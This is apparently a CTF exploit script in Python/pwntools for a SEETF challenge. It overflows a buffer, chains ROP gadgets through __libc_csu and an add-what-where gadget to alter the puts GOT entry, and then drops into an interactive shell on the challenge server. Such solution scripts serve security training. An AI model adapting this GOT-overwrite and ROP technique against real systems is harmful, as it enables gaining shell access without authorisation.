#!/usr/bin/env python3
from pwn import *
import time
import sys
import struct

local = 0
debug = 0

context.arch = 'amd64'
# context.aslr = False
context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# context.timeout = 2

def riconn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		io = process('./chall_patched')
		if debug:
			gdb.attach(s, gdbscript='''
            b* 0x00000000004012ae
            b* 0x00000000004011fc
            c
			''')
		else:
			pass
	else:
		io = remote('win.the.seetf.sg', 2004)

	return io


elf = ELF('./chall_patched')
libc = ELF('libc.so.6')


pop_rdi = 0x0000000000401313
pop_rsi_r15 = 0x0000000000401311
leave_ret = 0x000000000040122c
pop_rbp = 0x000000000040119d
ret = 0x000000000040101a
main = 0x000000000040122e
main_no_push = main+1
input_floats = 0x00000000004011b6
put_gots = 0x404018
csu = 0x40130a
add_what_where = 0x000000000040119c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret


def hex_to_float(hex_str):
    binary_str = bytes.fromhex(hex_str)
    unpacked = struct.unpack('!f', binary_str)
    return unpacked[0]

while True:
	io = riconn()
	payload = 0x61*b'A' + 8*b'A' + p64(csu) + p64(0x5f6de) + p64(put_gots+0x3d) + p64(0)*4 + p64(add_what_where) + p64(elf.sym['puts'])
	value = '3.544850151698461e-38'
	io.sendafter(b'ale.\n',payload)
	io.sendlineafter(b'number!\n', b'1')
	io.sendlineafter(b'number!\n', value.encode())
	io.sendlineafter(b'number!\n', b'+')	
	io.interactive()

